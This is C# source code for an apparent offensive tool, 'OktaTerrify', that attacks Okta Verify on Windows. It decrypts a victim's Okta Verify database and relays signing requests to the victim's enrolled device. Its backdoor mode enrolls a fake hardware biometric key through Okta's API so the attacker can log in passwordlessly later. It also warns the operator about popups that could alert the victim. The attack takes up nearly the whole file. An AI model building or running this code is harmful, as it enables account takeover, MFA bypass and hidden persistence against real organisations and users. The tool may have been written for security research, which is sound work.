using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using JWT;
using JWT.Builder;
using Mono.Options;
using Newtonsoft.Json;
using OktaVerify.Entity;
using SQLite;
using OktaTerrify.Entity;
using OktaTerrify.Signers;
using IdentityModel.OidcClient;
using OktaTerrify.Oidc;
using System.Threading.Tasks;
using NLog;
using OktaTerrify.ApiTypes;
using OktaCommon;
using System.Security.Cryptography;
using static SharpDPAPI.Interop;
using OktaTerrify;
using System.Net;

namespace OktaVerify {
    internal class OktaTerrify {

        static private readonly ILogger log = LogManager.GetLogger("OktaTerrify");
        static WebProxy proxy = new WebProxy {Address = new Uri($"http://localhost:8080"),BypassProxyOnLocal = false, UseDefaultCredentials = false};
        static HttpClient httpClient = new HttpClient(handler: new HttpClientHandler() { } );
        static string databasePath = null;
        static string sid = null;
        static string deviceId = null;
        static string userId = null;
        static string methodEnrollmentId = null;
        static string audience = null;
        static string nonce = null;
        static string tx = null;
        static string keyId = null;
        static string impersonate = null;
        static bool userVerification = false;
        static OktaSignParams signingInfo;

        struct OktaSignParams {
            public string DeviceEnrollmentId;
            public string UserId;
            public string Audience;
            public string Nonce;
            public string TransactionId;
            public string MethodEnrollmentId;
            public string VerifyURL;
            public string SandboxName;
            public byte[] InstanceIdentifier;
            public IEnumerable<Key> Keys;
            public string ExternalUrl;
            public string AuthenticatorLink;
            internal string EnrollmentLink;
            internal string DeviceId;
            internal string DeviceLink;
            internal string AuthenticatorId;

            public string ClientInstanceId { get; internal set; }
            public string Domain { get; internal set; }
            public IEnumerable<string> KeyTypes { get; internal set; }
            public byte[] DatabaseKey { get; internal set; }
            public byte[] KeyProtectionSeed { get; internal set; }
            public string Email { get; internal set; }
        }

        static string ToHex(byte[] bytes, bool upper = false) {
            char[] c = new char[bytes.Length * 2];
            int upperModify = upper ? 0 : 0x20;

            byte b;

            for (int bx = 0, cx = 0; bx < bytes.Length; ++bx, ++cx) {
                b = ((byte)(bytes[bx] >> 4));
                c[cx] = (char)(b > 9 ? b + 0x37 + upperModify : b + 0x30);

                b = ((byte)(bytes[bx] & 0x0F));
                c[++cx] = (char)(b > 9 ? b + 0x37 + upperModify : b + 0x30);
            }

            return new string(c);
        }

        static Jwk GenerateNewUserVerificationKey() {

            var random = new Random();
            var kidb = new byte[16];
            random.NextBytes(kidb);
            var kid = ToHex(kidb, true);

            var cngKey  = CngKey.Create(CngAlgorithm.Rsa, null, new CngKeyCreationParameters() { ExportPolicy = CngExportPolicies.AllowPlaintextExport });
            var privateKey = cngKey.Export(CngKeyBlobFormat.GenericPrivateBlob);
            var publicKey = new BCRYPT_RSAPUBLIC_BLOB(cngKey.Export(CngKeyBlobFormat.GenericPublicBlob));
           
            var jwk = new Jwk() {
                alg = "RS256",
                kid = $"BOL_{kid}",
                kty = "RSA",
                kpr = "HARDWARE",
                use = "sig",
                e = Utils.Base64Url(publicKey.PublicExponent),         
                n = Utils.Base64Url(publicKey.Modulus) 
            };

            File.WriteAllBytes($"BD_{kid}.key", privateKey);
            log.Info($"Generated new fake hardware biometric key and saved to file {$"BD_{kid}.key"}");
            return jwk;   
        }

        static void GetSigningInfo(string challengeRequest, ref OktaSignParams signParams) {
                                
            var challengeJWT = JwtBuilder.Create()
                    .WithValidationParameters(
                        new ValidationParameters {
                            ValidateSignature = false,
                            ValidateExpirationTime = false,
                            ValidateIssuedTime = false,
                            TimeMargin = 100
                        })
                    .Decode<IDictionary<string, JsonElement>>(challengeRequest);

            signParams.TransactionId = challengeJWT["transactionId"].GetString();
            signParams.Nonce = challengeJWT["nonce"].GetString();
            signParams.Audience = challengeJWT["iss"].GetString();
            signParams.VerifyURL = challengeJWT["verificationUri"].GetString();   
            signParams.KeyTypes = challengeJWT["keyTypes"].EnumerateArray().Select(e => e.GetString());
        }

        static OktaSignParams GetDatabaseInfo(string sid, string databasePath, byte[] dbKey) {

            if(dbKey == null)
                dbKey = GetLegacyDatabaseKey(sid);

            var db = new SQLiteConnection(new SQLiteConnectionString(databasePath, SQLiteOpenFlags.ReadOnly, false, key: dbKey));
            var deviceEnrollments = db.Query<DeviceEnrollment>("SELECT * from DeviceEnrollment", new object[] { });
            var authenticatorVerificationMethods = db.Query<AuthenticatorVerificationMethod>("SELECT * from AuthenticatorVerificationMethod", new object[] { });
            var orgInfos = db.Query<OrganizationInformation>("SELECT Id, Name, Domain, ClientInstanceId, SerializedOrgKeys, SerializedDeviceKey, DeviceId from OrganizationInformation", new object[] { });
            var oktaVerifyInfo = db.Query<OktaVerifyInformation>("SELECT * from OktaVerifyInformation", new object[] { }).FirstOrDefault();
            var userInfo = db.Query<UserInformation>("SELECT * from UserInformation", new object[] { }).FirstOrDefault();
            var deviceKeyList = new List<Key>();
   

            if (authenticatorVerificationMethods.Count > 0) {
                var deviceKeys = Encoding.UTF8.GetString(Convert.FromBase64String(authenticatorVerificationMethods[0].SerializedCredentials));
                var deviceKeysJson = JsonConvert.DeserializeObject<IEnumerable<Dictionary<string, dynamic>>>(deviceKeys);

                foreach (var key in deviceKeysJson) {
                    deviceKeyList.Add(new Key() {
                        KeyId = key["Value"]["id"].ToString(),
                        Sandboxed = (bool)key["Value"]["sndbxd"] || ((int)key["Value"]["prtct"] == 2),
                        Type = (KeyType)key["Key"]
                    });
                }
            }

            if (orgInfos.Count > 0) {
                var deviceKey = JsonConvert.DeserializeObject<Dictionary<string, dynamic>>(Encoding.UTF8.GetString(Convert.FromBase64String(orgInfos[0].SerializedDeviceKey.Split(new[] { '|' })[1])));
                deviceKeyList.Add(new Key() {
                    KeyId = deviceKey["id"].ToString(),
                    Sandboxed = (bool)deviceKey["sndbxd"] || ((int)deviceKey["prtct"] == 2),
                    Type = KeyType.DeviceAttestation
                });
            }

            return new OktaSignParams() {
                DeviceEnrollmentId = deviceEnrollments.Count > 0 ? deviceEnrollments[0].Id : "None",
                UserId = deviceEnrollments.Count > 0 ? deviceEnrollments?[0].UserId : "None",
                AuthenticatorLink = deviceEnrollments.Count > 0 ? deviceEnrollments[0].AuthenticatorLink : "None",
                DeviceLink = deviceEnrollments.Count > 0 ? deviceEnrollments[0].DeviceLink : "None",
                EnrollmentLink = deviceEnrollments.Count > 0 ? deviceEnrollments[0].EnrollmentLink : "None",
                ExternalUrl = deviceEnrollments.Count > 0 ? deviceEnrollments[0].ExternalUrl : "None",
                AuthenticatorId = deviceEnrollments.Count > 0 ? deviceEnrollments[0].AuthenticatorId : "None",
                MethodEnrollmentId = authenticatorVerificationMethods.Count > 0 ? authenticatorVerificationMethods[0].Id : "None",
                SandboxName = oktaVerifyInfo?.SandboxName,
                InstanceIdentifier = oktaVerifyInfo?.InstanceIdentifier,
                KeyProtectionSeed = oktaVerifyInfo?.ApplicationKeyProtectionSeed,
                Keys = deviceKeyList,                             
                ClientInstanceId = orgInfos.Count > 0 ? orgInfos?[0].ClientInstanceId : "None", 
                DeviceId = orgInfos.Count > 0 ? orgInfos?[0].DeviceId : "None",
                Domain = orgInfos.Count > 0 ? orgInfos?[0].Domain : "None",                
                DatabaseKey = dbKey,
                Email = userInfo?.Email
            };
        }  

        static byte[] GetLegacyDatabaseKey(string sid) {            
            byte[] sidStr = Encoding.ASCII.GetBytes(sid);
            return OktaCrypto.OktaHash(sidStr);           
        }
        
        static void SetupLogging() {
            var config = new NLog.Config.LoggingConfiguration();
            var logconsole = new NLog.Targets.ConsoleTarget("logconsole");
            config.AddRule(LogLevel.Info, LogLevel.Fatal, logconsole);
            LogManager.Configuration = config;
        }

        static Key GetBackdoorKey() {

            var backdoorKey =  Directory.EnumerateFiles(".", "BD_*.key");

            if (backdoorKey.Count() > 0) {
                var keyFile = backdoorKey.First();
                return new Key() {
                    Sandboxed = false,
                    Path = keyFile,
                    KeyId = Path.GetFileName(keyFile).Replace(".key", "").Replace("BD_","BOL_"),
                    Type = KeyType.Backdoor
                };
            } else {
                return null;         
            }
        }

        static async Task<bool> SendChallengeResponse(string challengeRequest) {

            GetSigningInfo(challengeRequest, ref signingInfo);
            string impersonateArgs = "";
            string userVerificationArgs = "";

            Key key = GetBackdoorKey();
            if (key == null) {

                key = signingInfo.Keys
                    .Where(k => k.Type == (signingInfo.KeyTypes.Contains("userVerification") ? KeyType.UserVerification : KeyType.ProofOfPossession))
                    .FirstOrDefault();

                if (key != null && key.Type == KeyType.UserVerification && userVerification == false) {
                    log.Warn("!!WARNING!! - Incoming sign request for the user verification key, this will cause a popup on the victim machine to enter user verification PIN/Password because no local key exists. To force generation of user verification key signing, add the -v argument.  Falling back to proof of possession key");
                    key = null;
                }

                if (key == default(Key)) {
                    key = signingInfo.Keys
                           .Where(k => k.Type ==  KeyType.ProofOfPossession)
                           .FirstOrDefault();
                }

                if (File.Exists($"{key.KeyId}.key")) {
                    key = new Key() {
                        KeyId = key.KeyId,
                        Path = $"{key.KeyId}.key",
                        Sandboxed = false,
                        Type = key.Type
                    };
                }
            } 

            if (key.Sandboxed) {
                impersonateArgs = $" -i {signingInfo.SandboxName}:{Convert.ToBase64String(signingInfo.InstanceIdentifier)}";
            }
            
            string signedJWT = null;

            if (key.Path == null) {
               
                if (key.Type == KeyType.UserVerification) {
                    userVerificationArgs = " -v";
                }

                string keyProtectionSeed = "";

                if(signingInfo.KeyProtectionSeed != null) {
                    keyProtectionSeed = $" -s {signingInfo.KeyProtectionSeed.Hex()}";
                }

                Console.WriteLine("[=] Sign the device bind JWT on the enrolled Okta Verify device");
                Console.WriteLine($"\n  OktaInk -o SignDeviceBind -k {key.KeyId} -d {signingInfo.DeviceEnrollmentId} -u {signingInfo.UserId} -n {signingInfo.Nonce} -t {signingInfo.TransactionId} -a {signingInfo.Audience} -m {signingInfo.MethodEnrollmentId}{keyProtectionSeed}{userVerificationArgs}{impersonateArgs}\n");
                signedJWT = ThreadedConsoleReader.WaitForLine("[.] Enter DeviceBind JWT:");

            } else {

                log.Info($"Using persistent key {key.Path} for signing");
                signedJWT = OktaCrypto.PerformingSigning(signingInfo.TransactionId, signingInfo.Nonce, key, signingInfo.UserId, signingInfo.DeviceEnrollmentId,
                    signingInfo.MethodEnrollmentId, signingInfo.Audience, null, true, new CngRSAAlgorithm(true, null), key.Type == KeyType.Backdoor ? "userVerificationBioOrPin" : key.Type == KeyType.UserVerification ?  "userVerification" : "proofOfPossession");
            }

            var response = await httpClient.PostAsync(signingInfo.VerifyURL, new StringContent($@"{{""challengeResponse"": ""{signedJWT}"", ""method"":""signed_nonce""}}", Encoding.UTF8, "application/json"));

            if (response.IsSuccessStatusCode) {
                log.Info("Signed JWT accepted, factor accepted");
                return true;
            } else {
                log.Error($"Signed JWT failed, verification failed with {response.ReasonPhrase}");
                return false;
            }
        }

        static string GetClientAttestationKey(OktaSignParams dbInfo) {

            var deviceAttestaionKey = dbInfo.Keys.Where(k => k.Type == KeyType.DeviceAttestation).First();
            
            if (!File.Exists($"{deviceAttestaionKey.KeyId}.key")) {
                Console.WriteLine("[=] Sign the device attestation JWT on the enrolled Okta Verify device");
                Console.WriteLine($"\n  OktaInk -o SignDeviceAttestation -k {deviceAttestaionKey.KeyId} --issuer {dbInfo.ClientInstanceId} --subject {dbInfo.DeviceId} --audience {dbInfo.Domain}{impersonate}\n");
                Console.WriteLine("[.] Enter DeviceAttestation JWT:");               
                return ThreadedConsoleReader.WaitForLine("[.] Enter DeviceAttestation JWT:");
            } else {

                deviceAttestaionKey = new Key {
                    KeyId = deviceAttestaionKey.KeyId,
                    Path = $"{deviceAttestaionKey.KeyId}.key",
                    Type = KeyType.DeviceAttestation,
                    Sandboxed = false
                };

                return OktaCrypto.BuildDeviceAttestationJwt(deviceAttestaionKey, dbInfo.Audience, dbInfo.ClientInstanceId, dbInfo.DeviceId, null);

            }           
        }
            
        static async Task Main(string[] args) {

            SetupLogging();

            bool showHelp = false;
            bool sign = false;
            bool info = false;
            bool backdoor = false;
            bool import = false;
            string privateKey = null;
            byte[] dbKey = null;

            //Create larger buffer to allow for lines larger that the default 255 chars
            byte[] inputBuffer = new byte[4096];
            Stream inputStream = Console.OpenStandardInput(inputBuffer.Length);   
            Console.SetIn(new StreamReader(inputStream, Console.InputEncoding, false, inputBuffer.Length));

            OptionSet option_set = new OptionSet()
                .Add("h|help", "Show this help", v => showHelp = true)
                .Add("s=|sid=", "The SID of the user belonging to the encrypted Okta Verify database", v => sid = v)
                .Add("info", "Show Okta database info", v => info = true)
                .Add("sign", "Operate in signing only mode, no backdoor key will be installed", v => sign = true)
                .Add("import", "Import a private key exported by OktaInk", v => import = true)                
                .Add("b|backdoor", "Backdoor an account using a fake biometric hardware key", v => backdoor = true)
                .Add("dbkey=", "Database key for decrypting newer DataStore.db databases", v => dbKey = v.FromHex())
                .Add("p=|privateKey=", "The private key data exported via OktaInk", v => privateKey = v)
                .Add("k=|keyId=", "The Windows crypto key id to use for signing", v => keyId = v)
                .Add("d=|deviceId=", "The enrolled Okta Verify device id", v => deviceId = v)
                .Add("u=|userId=", "The enrolled Okta Verify user id", v => userId = v)
                .Add("n=|nonce=", "The random nonce for the pending authentication", v => nonce = v)
                .Add("t=|transactionId=", "The transaction id for the pending authentication", v => tx = v)
                .Add("a=|audience=", "The target audience for the signed JWT (Okta tenant URL)", v => audience = v)
                .Add("m=|methodEnrollmentId=", "The method enrollment id from Okta database", v => methodEnrollmentId = v)
                .Add("i=|impersonate=", "Impersonate using a sandbox account (username:instanceid)", v => impersonate = v)
                .Add("v|userVerification", "Allow proxying of user verification key signing. WARNING - This will cause a Windows Hello PIN/Password dialog popup on the victim machine", v => userVerification = true)
                .Add("db=", "Path to the exfiltrated Okta SQLite database", v => databasePath = v);
                
            option_set.Parse(args);

            if (showHelp) {
                option_set.WriteOptionDescriptions(Console.Out);
                return;
            }

            if(sign && backdoor && info && import) {
                log.Error("Sign, Backdoor, Import and Info options are exclusive.  Specify only one");
                return;
            }

            if (databasePath == null) {
                databasePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Okta\\OktaVerify\\");

                if (File.Exists(Path.Combine(databasePath, "OVStore.db")))
                    databasePath = Path.Combine(databasePath, "OVStore.db");
                else if (File.Exists(Path.Combine(databasePath, "DataStore.db")))
                    databasePath = Path.Combine(databasePath, "DataStore.db");
                else {
                    Console.WriteLine($"[!] No database file specified, and cant find one inside {databasePath}");
                    return;
                }

                Console.WriteLine($"[=] No database file specified, using default {databasePath}");
            }
            
            var dbFileName = Path.GetFileName(databasePath);
            if (dbFileName == "OVStore.db") {
                if (sid == null) {
                    Console.WriteLine("[!] Database file looks like the legacy format, SID argument needed");
                    return;
                }
            } else if (dbFileName == "DataStore.db") {
                if (dbKey == null) {
                    Console.WriteLine("[!] Database file looks like the newer format, supply database key with dbkey argument.  This can be obtained using the following command on the victim machine:\n\rOktaInk -o DumpDBKey");
                    return;
                }
            } else {
                Console.WriteLine("[!] Database file name should be OVStore.db or DataStore.db");
                return;
            } 
                
            signingInfo = GetDatabaseInfo(sid, databasePath, dbKey);                
            

            log.Info("Okta Terrify is starting....");
            var httpServer = new LoopbackHttpListener(new int[] { 65112, 8769 }, new Func<string, Task<bool>>(SendChallengeResponse));

            httpClient.DefaultRequestHeaders.UserAgent.Clear();
            httpClient.DefaultRequestHeaders.UserAgent.Add(ProductInfoHeaderValue.Parse("OktaVerify/4.5.3.0"));
            httpClient.DefaultRequestHeaders.UserAgent.Add(ProductInfoHeaderValue.Parse("WPFDeviceSDK/1.7.4.27"));
            httpClient.DefaultRequestHeaders.UserAgent.Add(ProductInfoHeaderValue.Parse("Windows/10.0.22621.525"));
            httpClient.DefaultRequestHeaders.UserAgent.Add(ProductInfoHeaderValue.Parse("Microsoft_Corporation/Virtual_Machine"));
            httpClient.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
    
            if (sign) {

                if (sid == null || databasePath == null) {
                    Console.WriteLine("[!] Both SID and store database arguments needed");
                    return;
                }

                httpServer.Start();
                log.Info("Running in signing mode, press ESC to exit");

                await ThreadedConsoleReader.ConsoleLoop();               
                               
            }else if (import) { 

                if(keyId == null || privateKey == null) {
                    Console.WriteLine("[!] Both the key id and private key arguments need to be supplied");
                    return;
                }

                File.WriteAllBytes($"{keyId}.key", Convert.FromBase64String(privateKey));
                Console.WriteLine($"[+] Saved key {keyId} to disk ready for use");

            } else if (backdoor) {

                if (sid == null || databasePath == null) {
                    Console.WriteLine("[!] Both SID and store database arguments needed");
                    return;
                }
                                                        
                httpServer.Start();
                var consoleReader = ThreadedConsoleReader.ConsoleLoop();
                var backdoorKey = GetBackdoorKey();

                if (backdoorKey == null) {

                    var oidcClient = new OidcClient(new OidcClientOptions() {
                        ClientId = Identifiers.OktaClientId,
                        RedirectUri = "http://localhost:65112/login/callback",
                        Scope = "openid profile okta.authenticators.read okta.authenticators.manage okta.authenticators.manage.self okta.myAccount.appAuthenticator.manage",
                        Browser = new SystemBrowser(httpServer),
                        Authority = signingInfo.ExternalUrl
                    }) ;

                    var loginResult = await oidcClient.LoginAsync();

                    if (!loginResult.IsError) {

                        log.Info($"Authenticated as user {loginResult.User.FindFirst("preferred_username").Value}, enrolling a fake userVerify TPM key");
                        httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", loginResult.AccessToken);
                        var jwk = GenerateNewUserVerificationKey();
                        var currentUserVerifyKey = signingInfo.Keys.FirstOrDefault(k => k.Type == KeyType.UserVerification || k.Type == KeyType.UserVerificationBioOrPin);
                        var impersonate = currentUserVerifyKey.Sandboxed ? ($" --impersonate {signingInfo.SandboxName}:{Convert.ToBase64String(signingInfo.InstanceIdentifier)}") : "";
                        Jwk currentUserVerifyJWK = null;

                        if (currentUserVerifyKey != default(Key)) {

                            Console.WriteLine("[=] I now need the existing userVerification public key");
                            Console.WriteLine($"\n  OktaInk -o ExportPublic -k {currentUserVerifyKey.KeyId}{impersonate}\n");
                            var userVerificationPublicKey = ThreadedConsoleReader.WaitForLine("[.] Enter userVerification public key:");
                        
                            currentUserVerifyJWK = new Jwk() {
                                alg = "RSA256",
                                kid = currentUserVerifyKey.KeyId,
                                kty = "RSA",
                                kpr = "HARDWARE",
                                use = "sig",
                                e = "AQAB",
                                n = userVerificationPublicKey
                            };
                        }

                        var authenticator = new Authenticator() {
                            device = new Device() {
                                displayName = "DISPLAY_NAME",
                                osVersion = "10.0.22621.2506",
                                platform = "WINDOWS",
                                clientInstanceBundleId = "OktaVerify",
                                clientInstanceDeviceSdkVersion = "WPFDeviceSDK 1.7.5.7",
                                clientInstanceId = signingInfo.ClientInstanceId,
                                clientInstanceVersion = "4.6.1.0",
                                //deviceAttestation = new DeviceAttestation() {
                                //    clientInstanceKeyAttestation = clientInstanceKeyAttestation
                                //},
                                id = signingInfo.DeviceId
                            }
                        };

                        if (currentUserVerifyKey.Type == KeyType.UserVerification) {
                            authenticator.methods.Add(new Method() {
                                type = "signed_nonce",
                                keys = new Keys() {
                                    userVerificationBioOrPin = jwk,
                                    userVerification = currentUserVerifyJWK != null ? currentUserVerifyJWK : jwk
                                }
                            });
                        } else {
                            authenticator.methods.Add(new Method() {
                                type = "signed_nonce",
                                keys = new Keys() {
                                    userVerification = jwk,
                                    userVerificationBioOrPin = currentUserVerifyJWK != null ? currentUserVerifyJWK : jwk
                                }
                            });
                        }
                     
                        var str = JsonConvert.SerializeObject(authenticator, Formatting.None);
                        var result = await httpClient.PutAsync(signingInfo.EnrollmentLink, new StringContent(str, Encoding.UTF8, "application/json"));

                        if (result.StatusCode == System.Net.HttpStatusCode.OK) {
                            log.Info("Passwordless persistence successful, now running in FastPass mode");
                        } else {
                            log.Error($"Passwordless persistence failed, error {result.ReasonPhrase}");
                        }

                    } else {
                        log.Error($"Failed to login during key enrollment: {loginResult.Error}");
                    }

                } else {
                    log.Info($"Backdoor key already exists, running in FastPass mode using key {Path.GetFileName(backdoorKey.Path)}");
                }

                log.Info("Running in backdoor mode, press ESC to exit");
                consoleReader.Wait();

            } else if (info) {

                if (sid == null) {
                    sid = WindowsIdentity.GetCurrent().User.ToString();
                    Console.WriteLine($"[=] No SID specified, using current SID {sid}");
                }   

                Console.WriteLine("\n");
                Console.WriteLine($"Database Encryption Key: {ToHex(signingInfo.DatabaseKey)}");
                Console.WriteLine($"User Id                : {signingInfo.UserId}");
                Console.WriteLine($"Client Instance Id     : {signingInfo.ClientInstanceId}");
                Console.WriteLine($"Device Id              : {signingInfo.DeviceId}");
                Console.WriteLine($"Authenticator Url      : {signingInfo.AuthenticatorLink}");
                Console.WriteLine($"Email                  : {signingInfo.Email}");
                Console.WriteLine($"Method Enrollment Id   : {signingInfo.MethodEnrollmentId}");
                Console.WriteLine($"Device Enrollment Id   : {signingInfo.DeviceEnrollmentId}");
                Console.WriteLine($"Sandbox Account Name   : {(signingInfo.SandboxName != null ? signingInfo.SandboxName : "None")}");

                if (signingInfo.SandboxName != null)
                    Console.WriteLine($"Sandbox Account Encrypted Secret: {Convert.ToBase64String(signingInfo.InstanceIdentifier)}");

                Console.WriteLine("Keys:");
                foreach (var key in signingInfo.Keys) {
                    Console.WriteLine($"  Id: {key.KeyId}, Sandboxed: {(key.Sandboxed ? "Yes" : "No")}, Type {key.Type}");
                }
            }          
        }
    }
}